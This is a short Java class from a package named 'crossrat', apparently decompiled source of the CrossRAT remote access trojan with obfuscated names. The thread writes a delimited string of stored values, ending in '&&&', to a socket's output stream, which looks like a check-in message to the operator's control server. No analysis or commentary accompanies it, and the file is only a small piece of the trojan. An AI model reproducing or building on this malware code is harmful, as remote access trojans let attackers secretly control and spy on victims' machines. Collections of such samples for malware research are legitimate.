package crossrat;

import java.io.DataOutputStream;
import java.io.InterruptedIOException;

final class g extends Thread {
    public final void run() {
        try {
            (new DataOutputStream(k.k.getOutputStream())).writeBytes(k.g + k.d + k.x + k.d + "&&&");
        } catch (InterruptedIOException var2) {
            Thread.currentThread().interrupt();
        } catch (Exception var3) {
            if (!this.isInterrupted()) {
                var3.printStackTrace();
            }

        }
    }
}
